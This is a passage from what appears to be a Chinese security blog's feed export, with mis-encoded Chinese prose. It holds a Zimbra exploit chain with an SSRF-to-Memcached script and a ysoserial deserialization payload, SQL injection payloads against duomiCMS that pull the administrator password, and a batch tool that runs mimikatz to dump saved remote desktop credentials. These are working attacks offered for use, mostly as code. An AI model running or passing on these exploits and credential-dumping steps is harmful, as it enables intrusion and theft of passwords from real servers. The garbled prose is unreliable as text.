class="name">soap:Header</span>&gt;</span><span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span><span class="tag">&lt;<span class="name">BatchRequest</span> <span class="attr">xmlns</span>=<span class="string">"urn:zimbra"</span> <span class="attr">onerror</span>=<span class="string">"stop"</span>&gt;</span><span class="tag">&lt;<span class="name">ModifyConfigRequest</span> <span class="attr">xmlns</span>=<span class="string">"urn:zimbraAdmin"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">xmlns</span>=<span class="string">""</span> <span class="attr">n</span>=<span class="string">"zimbraMemcachedClientServerList"</span>&gt;</span>127.0.0.1<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">ModifyConfigRequest</span>&gt;</span><span class="tag">&lt;/<span class="name">BatchRequest</span>&gt;</span><span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p><img src="list.jpg" alt="list"></p>
<p>å¯é€šè¿‡å‘½ä»¤æŸ¥çœ‹æ˜¯å¦è®¾ç½®æˆåŠŸ</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">/opt/zimbra/bin/zmprov gs `/opt/zimbra/bin/zmhostname` zimbraMemcachedClientServerList</span><br></pre></td></tr></tbody></table></figure>
<p><img src="listResult.jpg" alt="listResult"></p>
<h3 id="2-reload"><a class="header-anchor" href="#2-reload">Â¶</a>2. reload</h3>
<p>æ ¹æ®ä½œè€…è¯´æ³•ï¼Œreloadåå³å¯å®Œæˆ<code>Memcached</code>é‡è½½</p>
<figure class="highlight xml"><figcaption><span>ReloadMemcachedClientConfigRequest</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span> <span class="attr">xmlns:soap</span>=<span class="string">"http://www.w3.org/2003/05/soap-envelope"</span>&gt;</span><span class="tag">&lt;<span class="name">soap:Header</span>&gt;</span><span class="tag">&lt;<span class="name">context</span> <span class="attr">xmlns</span>=<span class="string">"urn:zimbra"</span>&gt;</span><span class="tag">&lt;<span class="name">userAgent</span> <span class="attr">xmlns</span>=<span class="string">""</span> <span class="attr">name</span>=<span class="string">"ZimbraWebClient - FF52 (Win)"</span>/&gt;</span><span class="tag">&lt;<span class="name">session</span> <span class="attr">xmlns</span>=<span class="string">""</span> <span class="attr">id</span>=<span class="string">"3129324"</span>/&gt;</span><span class="tag">&lt;<span class="name">format</span> <span class="attr">xmlns</span>=<span class="string">""</span> <span class="attr">type</span>=<span class="string">"js"</span>/&gt;</span><span class="tag">&lt;<span class="name">csrfToken</span> <span class="attr">xmlns</span>=<span class="string">""</span>&gt;</span>0_62c250d442e69ba3a624ac1bea96dac8648b86f6<span class="tag">&lt;/<span class="name">csrfToken</span>&gt;</span><span class="tag">&lt;/<span class="name">context</span>&gt;</span><span class="tag">&lt;/<span class="name">soap:Header</span>&gt;</span><span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span><span class="tag">&lt;<span class="name">BatchRequest</span> <span class="attr">xmlns</span>=<span class="string">"urn:zimbra"</span> <span class="attr">onerror</span>=<span class="string">"stop"</span>&gt;</span><span class="tag">&lt;<span class="name">ReloadMemcachedClientConfigRequest</span> <span class="attr">xmlns</span>=<span class="string">"urn:zimbraAdmin"</span>&gt;</span><span class="tag">&lt;/<span class="name">ReloadMemcachedClientConfigRequest</span>&gt;</span><span class="tag">&lt;/<span class="name">BatchRequest</span>&gt;</span><span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>webè¯·æ±‚å“åº”<code>reloadResponse</code>æ­£å¸¸ï¼Œè¯æ˜reloadæˆåŠŸ</p>
<p><img src="reload.jpg" alt="reload"></p>
<p>ä½†æˆ‘å®æµ‹å‘ç°å¹¶ä¸è¡Œï¼Œéœ€è¦<code>zmcontrol restart</code>ï¼Œå‘äº†å¾ˆä¹…ï¼Œä¹Ÿå°±æ˜¯è¯´æ— æ³•<code>reload</code>è®©zimbraé‡æ–°åŠ è½½<code>memcached</code>ï¼Œåˆ°è¿™ä¸€æ­¥å°±æ„Ÿè§‰é¸¡è‚‹äº†ï¼Œä½†ä¹Ÿå¯èƒ½æ˜¯æˆ‘å§¿åŠ¿æœ‰è¯¯ã€‚</p>
<h3 id="3-è·å–id"><a class="header-anchor" href="#3-è·å–id">Â¶</a>3. è·å–id</h3>
<p>å¦‚æœèƒ½<code>xxe</code>æ‰“åˆ°<code>localconfig.xml</code>ï¼Œå³æ‹¿åˆ°<code>ldap_password</code>ï¼Œæ­¤æ—¶å¯é€šè¿‡ç®¡ç†è´¦å·åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·ï¼Œæ— éœ€ç™»å½•å³å¯å¾—åˆ°<code>id</code>ï¼Œå¦‚å›¾æ‰€ç¤º</p>
<p><img src="creatAccount.jpg" alt="creatAccount"></p>
<p>è‹¥æœªèƒ½<code>xxe</code>ï¼Œåˆ™åªèƒ½é€šè¿‡å…¶ä»–æ‰‹æ®µï¼ˆæš´ç ´ç­‰ï¼‰è·å–ä¸€ä¸ªç”¨æˆ·è´¦å¯†</p>
<h3 id="4-è·å–modseqå’Œuidvalidity"><a class="header-anchor" href="#4-è·å–modseqå’Œuidvalidity">Â¶</a>4. è·å–modseqå’Œuidvalidity</h3>
<p>ä½¿ç”¨åˆšåˆ›å»ºçš„ç”¨æˆ·ç™»å½•imapï¼Œå¹¶<code>select inbox</code>è·å–ï¼›<br>
<code>imap</code>ç«¯å£ä¸º<code>143</code>ã€<code>993</code>ï¼Œ<code>143</code>ä¸ªåˆ«æœºå™¨å…è®¸æ˜æ–‡ç™»å½•ï¼Œå¤§å¤šæ•°ä¸å¯æ˜æ–‡ç™»å½•ä¸”æœ‰å¾ˆå¤šå¥‡æ€ªé”™è¯¯ï¼Œæ•…ä½¿ç”¨<code>993</code>åŠ å¯†ç™»å½•</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">ncat --ssl [ip] 993</span><br><span class="line">axyz login <span class="built_in">test</span> test123456</span><br><span class="line">a <span class="keyword">select</span> inbox</span><br><span class="line">axyz <span class="built_in">logout</span></span><br></pre></td></tr></tbody></table></figure>
<p><img src="imap.jpg" alt="imap"></p>
<h3 id="5-ç”Ÿæˆpayload"><a class="header-anchor" href="#5-ç”Ÿæˆpayload">Â¶</a>5. ç”Ÿæˆpayload</h3>
<p>ä¸‹è½½<a href="https://github.com/frohoff/ysoserial/">ysoserial</a>æºç ï¼Œæ­¤å¤„ä½œè€…æ²¡è¯´æ¸…ï¼Œéœ€è¦ä¿®æ”¹<code>pom.xml</code>ï¼Œå°†<code>1.7R2</code>æ”¹ä¸º<code>1.6R7</code>ï¼Œç„¶åé‡æ–°æ‰“åŒ…ï¼Œæ‰“åŒ…è¿‡ç¨‹è®©åŒäº‹å¸®å¿™å®Œæˆã€‚</p>
<p><code>echo justatest &gt; /tmp/justatest.txt</code></p>
<p>payloadä»è¿™<a href="http://jackson-t.ca/runtime-exec-payloads.html">http://jackson-t.ca/runtime-exec-payloads.html</a>ç”Ÿæˆ</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar MozillaRhino2 "bash -c {echo,ZWNobyBqdXN0YXRlc3QgPiAvdG1wL2p1c3RhdGVzdC50eHQ=}|{base64,-d}|{bash,-i}" &gt; wakaka.obj</span><br></pre></td></tr></tbody></table></figure>
<h3 id="6-SSRF-to-Memcached"><a class="header-anchor" href="#6-SSRF-to-Memcached">Â¶</a>6. SSRF to Memcached</h3>
<p>ä½¿ç”¨ä½œè€…ç»™çš„è¯·æ±‚è„šæœ¬ï¼Œä¿®æ”¹ä¸Šè¿°è·å–çš„åˆ°3ä¸ªå€¼ï¼Œå’Œ<code>adminToken</code>åŠåŸŸåï¼Œåˆ©ç”¨<code>ssrf</code>å‘<code>11211</code>å‘èµ·è¯·æ±‚</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line">accountid = <span class="string">"[2ebf42fc-d971-438c-8734-912f4ed90fa9]"</span> </span><br><span class="line">folderNo= <span class="number">2</span> </span><br><span class="line">modseq = [<span class="number">1</span>]</span><br><span class="line">uidvalidity = [<span class="number">1</span>]</span><br><span class="line">cacheKey =<span class="string">"zmImap:{accountId}:{folderNo}:{modseq}:{uidvalidity}"</span>.<span class="built_in">format</span>(accountId=accountid,folderNo=<span class="built_in">str</span>(folderNo),modseq=<span class="built_in">str</span>(modseq),uidvalidity=<span class="built_in">str</span>(uidvalidity)) </span><br><span class="line"><span class="built_in">print</span>(cacheKey) </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r"wakaka.obj"</span>,<span class="string">"rb"</span>) <span class="keyword">as</span> f: </span><br><span class="line">	payload = f.read() </span><br><span class="line">	</span><br><span class="line">set_command = <span class="string">b"set {cacheKey} 2048 3600 {payloadsize}\r\n"</span>.<span class="built_in">format</span>(cacheKey=cacheKey,payloadsize=<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))+payload+<span class="string">"\r\n"</span> </span><br><span class="line"></span><br><span class="line">headers = {<span class="string">"Cookie"</span>:<span class="string">"ZM_ADMIN_AUTH_TOKEN=[0_a371057a5246a4e62484dee80cc0733a6b2d10d2_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313535363633363536323334373b61646d696e3d313a313b747970653d363a7a696d6272613b753d313a613b7469643d393a3136353638373835343b];"</span>, <span class="string">"host"</span>:<span class="string">"[domain.com]:7071"</span>} </span><br><span class="line">r = requests.post(<span class="string">"https://[domain.com]/service/proxy?target=http://127.0.0.1:11211"</span>,data=set_command,headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h3 id="7-è§¦å‘ååºåˆ—åŒ–"><a class="header-anchor" href="#7-è§¦å‘ååºåˆ—åŒ–">Â¶</a>7. è§¦å‘ååºåˆ—åŒ–</h3>
<p>å†æ¬¡imapç™»é™†åŒä¸€è´¦å·å¹¶<code>select inbox</code></p>
<p>æŸ¥çœ‹<code>/tmp</code>ç›®å½•</p>
<p><img src="success.jpg" alt="success"></p>
<h2 id="æ€»ç»“"><a class="header-anchor" href="#æ€»ç»“">Â¶</a>æ€»ç»“</h2>
<ol>
<li>ç›®æ ‡éœ€å¼€æ”¾<code>7071</code></li>
<li>èƒ½é‡å¯zimbraæœåŠ¡å™¨ï¼Œæˆ–<code>reload</code>æˆåŠŸå®ŒæˆåŠ è½½</li>
</ol>
<p>è¿™ä¹ˆä¸€çœ‹ï¼Œå¦ˆè€¶ï¼Œå¥½é¸¡è‚‹<br>
ä½†æœ‰æœ‹å‹å‘Šè¯‰æˆ‘ï¼Œæ¡ä»¶å…è®¸çš„è¯ï¼Œ<code>7071</code>ä¸å¼€æ”¾ä¹Ÿå¯è¡Œï¼Œè‹¥<code>7071</code>å¼€æ”¾ï¼Œè¿˜èƒ½é€šæ€ï¼ŸåŒ…æ‹¬<code>8.8.x</code>ï¼Œä¹Ÿè®¸ä»–ä»¬ç ”ç©¶å‡ºäº†<code>ssrf</code>å¸¦<code>cookie</code>çš„æ“ä½œï¼Ÿ<br>
å¥½å§ï¼Œç ”ç©¶ä¸é€ï¼Œæœ‰ç ”ç©¶çš„æœ‹å‹å¯ä»¥äº¤æµä¸€ä¸‹ã€‚</p>
<p>å¦å¤–è¯´ä¸‹åŸä½œè€…<code>fnmsd</code>ï¼Œäººè¶…å¥½ï¼Œé—®é—®é¢˜å›ç­”çš„å¾ˆè¯¦ç»†ï¼Œå¾ˆæœ‰è€å¿ƒï¼Œè¿™ç¯‡æ•´ä½“çš„å¤ç°é‡åˆ°å¾ˆå¤šå‘ï¼Œå¸ˆå‚…ä¹Ÿå¸®æˆ‘å„ç§è§£ç­”ï¼Œååˆ†æ„Ÿè°¢ï¼é˜¿é‡Œå˜å¤šï¼</p>
<h2 id="å‚è€ƒé“¾æ¥"><a class="header-anchor" href="#å‚è€ƒé“¾æ¥">Â¶</a>å‚è€ƒé“¾æ¥</h2>
<p><a href="https://blog.csdn.net/fnmsd/article/details/89235589">https://blog.csdn.net/fnmsd/article/details/89235589</a></p>
]]></content>
      <tags>
        <tag>Zimbra</tag>
        <tag>ååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>duomiCMS</title>
    <url>/2016/11/01/duomiCMS/</url>
    <content><![CDATA[<h2 id="å˜é‡è¦†ç›–å¯¼è‡´æ³¨å…¥"><a class="header-anchor" href="#å˜é‡è¦†ç›–å¯¼è‡´æ³¨å…¥">Â¶</a>å˜é‡è¦†ç›–å¯¼è‡´æ³¨å…¥</h2>
<ol>
<li>
<p>æ¼æ´é¡µé¢ï¼š<code>\member\invitation.php</code></p>
 <figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$dm</span>==<span class="string">'yq'</span>)</span><br><span class="line">{</span><br><span class="line">	<span class="variable">$ccgid</span>=<span class="variable">$_SESSION</span>[<span class="string">'duomi_user_group'</span>];</span><br><span class="line">	<span class="variable">$ccuid</span>=<span class="variable">$_SESSION</span>[<span class="string">'duomi_user_id'</span>];</span><br><span class="line">	<span class="variable">$cc1</span>=<span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">GetOne</span>(<span class="string">"select * from duomi_member_group where gid=<span class="subst">$ccgid</span>"</span>);</span><br><span class="line">	<span class="variable">$ccgroup</span>=<span class="variable">$cc1</span>[<span class="string">'gname'</span>];</span><br><span class="line">	<span class="variable">$cc2</span>=<span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">GetOne</span>(<span class="string">"select * from duomi_member where id=<span class="subst">$ccuid</span>"</span>);</span><br><span class="line">	<span class="variable">$ccjifen</span>=<span class="variable">$cc2</span>[<span class="string">'points'</span>];</span><br><span class="line">	<span class="variable">$ccemail</span>=<span class="variable">$cc2</span>[<span class="string">'email'</span>];</span><br><span class="line">	<span class="variable">$cclog</span>=<span class="variable">$cc2</span>[<span class="string">'logincount'</span>];</span><br></pre></td></tr></tbody></table></figure>
<p>$ccgidï¼Œ$ccuidå‡æ— ä»»ä½•è¿‡æ»¤ç›´æ¥å¸¦å…¥æŸ¥è¯¢ï¼Œç”±äºå˜é‡è¦†ç›–å¯¼è‡´æ­¤å¤„ä¸¤ä¸ªå˜é‡å‡å¯æ§åˆ¶</p>
<p>è¯¥cmsé‡‡ç”¨80secé€šç”¨é˜²æ³¨å…¥ï¼Œç½‘ä¸Šå…¬å¼€æ–¹æ³•å³å¯ç»•è¿‡ã€‚</p>
<p>åˆ©ç”¨ï¼šæ¥åˆ°memberé¡µé¢ï¼Œéšä¾¿æ³¨å†Œä¸€ä¸ªç”¨æˆ·,test,ç™»å…¥ã€‚</p>
 <figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">http:<span class="comment">//127.0.0.1/duomicms_1.30/member/invitation.php</span></span><br><span class="line">_SESSION[duomi_user_id]=@`<span class="string">'` or updatexml(1, concat(0x7c, (select password from duomi_admin)), 3) and 1=@`'</span>`&amp;_SESSION[duomi_user_group]=<span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>
<p>æ³¨å‡ºç®¡ç†å‘˜å¯†ç </p>
 <span id="more"></span>
 <img src="/2016/11/01/duomiCMS/duomiCMS_01.png" class="">
</li>
<li>
<p>æ¼æ´é¡µé¢ï¼š<code>\member\share.php</code></p>
 <figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$dm</span>==<span class="string">'index'</span>)</span><br><span class="line">{</span><br><span class="line"><span class="variable">$ccgid</span>=<span class="variable">$_SESSION</span>[<span class="string">'duomi_user_group'</span>];</span><br><span class="line"><span class="variable">$ccuid</span>=<span class="variable">$_SESSION</span>[<span class="string">'duomi_user_id'</span>];</span><br><span class="line"><span class="variable">$cc1</span>=<span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">GetOne</span>(<span class="string">"select * from duomi_member_group where gid=<span class="subst">$ccgid</span>"</span>);</span><br><span class="line"><span class="variable">$ccgroup</span>=<span class="variable">$cc1</span>[<span class="string">'gname'</span>];</span><br><span class="line"><span class="variable">$cc2</span>=<span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">GetOne</span>(<span class="string">"select * from duomi_member where id=<span class="subst">$ccuid</span>"</span>);</span><br><span class="line"><span class="variable">$ccjifen</span>=<span class="variable">$cc2</span>[<span class="string">'points'</span>];</span><br><span class="line"><span class="variable">$ccemail</span>=<span class="variable">$cc2</span>[<span class="string">'email'</span>];</span><br><span class="line"><span class="variable">$cclog</span>=<span class="variable">$cc2</span>[<span class="string">'logincount'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"</span></span><br><span class="line"><span class="string">å¼€å‘ä¸­ï¼š</span></span><br><span class="line"><span class="string">"</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>$ccgidï¼Œ$ccuidï¼ŒåŒä¸Š</p>
 <figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">http:<span class="comment">//127.0.0.1/duomicms_1.30/member/share.php</span></span><br><span class="line">dm=index&amp;_SESSION[duomi_user_id]=<span class="number">1</span>&amp;_SESSION[duomi_user_group]=@`<span class="string">'` or updatexml(1, concat(0x7c, (select password from duomi_admin)), 3) and 1=@`'</span>`</span><br></pre></td></tr></tbody></table></figure>
 <img src="/2016/11/01/duomiCMS/duomiCMS_02.png" class="">
</li>
<li>
<p>æ¼æ´é¡µé¢ï¼š<code>\member\exchange.php</code></p>
 <figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$dm</span>==<span class="string">'mybuy'</span>)</span><br><span class="line">{</span><br><span class="line"><span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">"page"</span>];</span><br><span class="line"><span class="variable">$pcount</span> = <span class="number">20</span>;</span><br><span class="line"><span class="variable">$row</span>=<span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">getOne</span>(<span class="string">"select count(id) as dd from duomi_buy where uid="</span>.<span class="variable">$uid</span>);</span><br><span class="line"><span class="variable">$rcount</span>=<span class="variable">$row</span>[<span class="string">'dd'</span>];	</span><br><span class="line"><span class="variable">$page_count</span> = <span class="title function_ invoke__">ceil</span>(<span class="variable">$rcount</span>/<span class="variable">$pcount</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">'page'</span>])||<span class="variable">$_GET</span>[<span class="string">'page'</span>]&lt;<span class="number">0</span>){ </span><br><span class="line"><span class="variable">$page</span>=<span class="number">1</span>; </span><br><span class="line">}<span class="keyword">else</span> { </span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">'page'</span>]; </span><br><span class="line">}</span><br><span class="line"><span class="variable">$select_limit</span> = <span class="variable">$pcount</span>; </span><br><span class="line"><span class="variable">$select_from</span> = (<span class="variable">$page</span> - <span class="number">1</span>) * <span class="variable">$pcount</span>.<span class="string">','</span>; </span><br><span class="line"><span class="variable">$pre_page</span> = (<span class="variable">$page</span> == <span class="number">1</span>)? <span class="number">1</span> : <span class="variable">$page</span> - <span class="number">1</span>; </span><br><span class="line"><span class="variable">$next_page</span>= (<span class="variable">$page</span> == <span class="variable">$page_count</span>)? <span class="variable">$page_count</span> : <span class="variable">$page</span> + <span class="number">1</span> ; </span><br><span class="line"><span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">setQuery</span>(<span class="string">"select * from duomi_buy where uid="</span>.<span class="variable">$uid</span>.<span class="string">" limit "</span>.(<span class="variable">$page</span>-<span class="number">1</span>)*<span class="variable">$pcount</span>.<span class="string">",<span class="subst">$pcount</span>"</span>);</span><br><span class="line"><span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">Execute</span>(<span class="string">'buylist'</span>);</span><br></pre></td></tr></tbody></table></figure>
<p>$uidï¼Œsessionå–å€¼ï¼Œæ— è¿‡æ»¤å¸¦å…¥æŸ¥è¯¢ï¼Œpostæäº¤å³å¯è¦†ç›–è¯¥å˜é‡</p>
 <figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">http:<span class="comment">//127.0.0.1/duomicms_1.30/member/exchange.php</span></span><br><span class="line">_SESSION[duomi_user_id]=@`<span class="string">'` or updatexml(1, concat(0x7c, (select password from duomi_admin)), 3) and 1=@`'</span>`</span><br></pre></td></tr></tbody></table></figure>
 <img src="/2016/11/01/duomiCMS/duomiCMS_03.png" class="">
</li>
</ol>
]]></content>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>getPass - ä¸€é”®æ‰¹é‡è·å–è¿œç¨‹ç»ˆç«¯å‡­æ®å¯†ç </title>
    <url>/2018/01/18/getPass-%E4%B8%80%E9%94%AE%E6%89%B9%E9%87%8F%E8%8E%B7%E5%8F%96%E8%BF%9C%E7%A8%8B%E7%BB%88%E7%AB%AF%E5%87%AD%E6%8D%AE%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h1>å‰è¨€</h1>
<blockquote>
<p><a href="https://mp.weixin.qq.com/s?__biz=MjM5MDkwNjA2Nw==&amp;mid=2650374152&amp;idx=2&amp;sn=53def8b9c8301d0c027cad32e8982c1a&amp;chksm=beb083b489c70aa2474210a70a15ef7d978bd1a3b29de0ead7da65261cd7bd027364a2494ea2&amp;mpshare=1&amp;scene=23&amp;srcid=12298b5FBQUycN1sXhWdm6gV#rd">ã€å¥‡æŠ€æ·«å·§ã€‘ç ´è§£è¿œç¨‹ç»ˆç«¯å‡­æ®ï¼Œè·å–æœåŠ¡å™¨å¯†ç </a></p>
</blockquote>
<p>æƒ³å¿…å¤§å®¶éƒ½çœ‹äº†è¿™ç¯‡æ–‡ç« å§ï¼ŒåœŸå¸12æœˆæ¨é€çš„ï¼Œéå¸¸å¥½çš„ç ´è§£æ–¹å¼ï¼Œå†…ç½‘ä¸­èƒ½èµ·åˆ°ç›¸å½“å¤§çš„ä½œç”¨ï¼Œç›¸ä¿¡ä¸å°‘äººå·²ç»å»å®è·µäº†ä¸€éï¼Œè¿‡ç¨‹ä¹‹ç¹ççœŸæ˜¯è®©æˆ‘ä»¬è¿™äº›äººæœ›è€Œå´æ­¥ã€‚</p>
<p>æˆ‘å¯ä¸æƒ³æ¯æ‹¿åˆ°ä¸€å°å†…ç½‘æœºï¼Œéƒ½è¦é‡å¤çš„å»åšè¿™ä¹ˆå¤æ‚çš„æ“ä½œï¼Œè€Œä¸”æ¯ä¸€ä¸ªå‡­æ®éƒ½è¦åšä¸€éã€‚</p>
<p>å¯¹æ‰¹å¤„ç†ä¸ç†Ÿï¼ŒèŠ±äº†å‡ å¤©æ—¶é—´ï¼Œå†™äº†ä¸ªbatï¼Œä¸€é”®æ‰¹é‡è·å–ã€‚</p>
<h1>Code</h1>
<figure class="highlight bat"><table><tbody><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">setlocal</span> enabledelayedexpansion</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> [+] <span class="built_in">Start</span>. Code by redn3ck.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> flag=<span class="number">0</span>	<span class="built_in">REM</span> åˆ¤æ–­æ˜¯å¦å­˜åœ¨Credentials</span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> ('<span class="built_in">dir</span> /a/s/b c:\Users\Administrator\AppData\Local\Microsoft\Credentials') <span class="keyword">do</span> (</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">exist</span> <span class="variable">%%i</span> (</span><br><span class="line">		<span class="built_in">set</span> file=<span class="variable">%%i</span></span><br><span class="line">		<span class="built_in">set</span> flag=<span class="number">1</span></span><br><span class="line">		<span class="built_in">echo</span> <span class="variable">!file!</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> /f "delims=: tokens=<span class="number">1</span>,<span class="number">2</span>" <span class="variable">%%i</span> <span class="keyword">in</span> ('mimikatz.exe "dpapi::cred /<span class="keyword">in</span>:<span class="variable">!file!</span>" "<span class="keyword">exit</span>" ^| <span class="built_in">findstr</span> guidMasterKey') <span class="keyword">do</span> <span class="built_in">set</span> guidMasterKey=<span class="variable">%%j</span></span><br><span class="line"><span class="comment">		REM echo !guidMasterKey!</span></span><br><span class="line"></span><br><span class="line">		mimikatz "privilege::debug" "sekurlsa::dpapi" "<span class="keyword">exit</span>" &gt; MasterKey.txt</span><br><span class="line"><span class="comment">			</span></span><br><span class="line"><span class="comment">		REM findstr /n è¿”å›è¡Œå· example: 1:       * GUID      :  {b619a08d-f4c3-408d-b733-bc89bd94ca0b}</span></span><br><span class="line">		<span class="keyword">for</span> /f "delims=:" <span class="variable">%%i</span> <span class="keyword">in</span> ('<span class="built_in">findstr</span> /n "<span class="variable">!guidMasterKey!</span>" MasterKey.txt') <span class="keyword">do</span> (</span><br><span class="line">		<span class="built_in">set</span> /a lineNum=<span class="variable">%%i</span>+<span class="number">1</span></span><br><span class="line"><span class="comment">		REM echo !lineNum!</span></span><br><span class="line">		<span class="keyword">call</span> :next</span><br><span class="line">		)</span><br><span class="line">	)</span><br><span class="line">)</span><br><span class="line">:end</span><br><span class="line"><span class="keyword">if</span> <span class="variable">!flag!</span>==<span class="number">0</span> <span class="built_in">echo</span> [-] No credentials :(</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> [+] End</span><br><span class="line"><span class="keyword">exit</span> /b	</span><br><span class="line"></span><br><span class="line">:next</span><br><span class="line"><span class="keyword">for</span> /f "skip=<span class="variable">%lineNum%</span> delims=" <span class="variable">%%i</span> <span class="keyword">in</span> ('<span class="built_in">type</span> MasterKey.txt') <span class="keyword">do</span> (</span><br><span class="line"><span class="built_in">set</span> MasterKeyTemp=<span class="variable">%%i</span></span><br><span class="line"><span class="keyword">goto</span> next2</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">:next2</span><br><span class="line"><span class="built_in">set</span> MasterKey=<span class="variable">%MasterKeyTemp:~16%</span></span><br><span class="line"><span class="comment">REM echo %MasterKey%</span></span><br><span class="line">mimikatz "dpapi::cred /<span class="keyword">in</span>:<span class="variable">%file%</span> /masterkey:<span class="variable">%MasterKey%</span>" "<span class="keyword">exit</span>" &gt; pass.txt</span><br><span class="line"><span class="built_in">findstr</span> "TargetName UserName CredentialBlob" pass.txt</span><br><span class="line"><span class="built_in">del</span> MasterKey.txt</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<span id="more"></span>
<p>ä½ åªéœ€æŠŠmimikatzå’ŒgetCredentialsPass.batæ”¾åœ¨åŒç›®å½•ï¼Œè¿è¡Œbatå³å¯ä¸€é”®æ‰¹é‡è·å–è¿œç¨‹ç»ˆç«¯å‡­æ®å¯†ç </p>
<img src="/2018/01/18/getPass-%E4%B8%80%E9%94%AE%E6%89%B9%E9%87%8F%E8%8E%B7%E5%8F%96%E8%BF%9C%E7%A8%8B%E7%BB%88%E7%AB%AF%E5%87%AD%E6%8D%AE%E5%AF%86%E7%A0%81/getPass.png" class="">
<h1>Reply</h1>
<p>æƒé™é—®é¢˜ï¼šå½“ç„¶éœ€è¦é«˜æƒé™ï¼Œæ¯•ç«Ÿä½ è¦è®¿é—®é«˜æƒé™æ–‡ä»¶</p>
<p>æ¡Œé¢ï¼šæ— éœ€æœ‰æ¡Œé¢ï¼Œåªéœ€æœ‰shellï¼Œé‡å®šå‘å³å¯ï¼ŒgetCredentialsPass.bat &gt;&gt; test.txt</p>
<h1>TCV</h1>
<p>tcv=1</p>
]]></content>
      <tags>
        <tag>å·¥å…·</tag>
      </tags>
  </entry>
  <entry>
    <title>python - æœ¬åœ°æ–‡ä»¶æ“ä½œ</title>
    <url>/2020/09/23/python-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a class="header-anchor" href="#å‰è¨€">Â¶</a>å‰è¨€</h2>
<p>æ‹¿åˆ°ä¸€ä¸ªæœ¬åœ°æ–‡ä»¶æ“ä½œéœ€æ±‚ï¼Œå†™ä¸ª<code>py</code>å®Œæˆ<br>
æ°´æ–‡ï¼Œä»…ä½œç¬”è®°ç”¨é€”ï¼Œå†ä¸æ°´ä¸€å¹´è¦è¿‡å»äº†ï¼Œè“å—ã€‚ã€‚é¦™è‡ã€‚ã€‚</p>
<h2 id="éœ€æ±‚"><a class="header-anchor" href="#éœ€æ±‚">Â¶</a>éœ€æ±‚</h2>
<p>è¦æ±‚ï¼šè§£æ<code>"æ–‡ä»¶ä¿¡æ¯.txt"</code>ï¼Œæ ¹æ®è§£æå‡ºçš„<code>md5</code>å€¼æ‰¾åˆ°å¯¹åº”çš„æ–‡ä»¶ï¼ŒæŒ‰ç…§è§£æå‡ºçš„æ–‡ä»¶è·¯å¾„å¤åˆ¶åˆ°ç›¸åº”çš„ç›®å½•ä¸‹ã€‚<br>
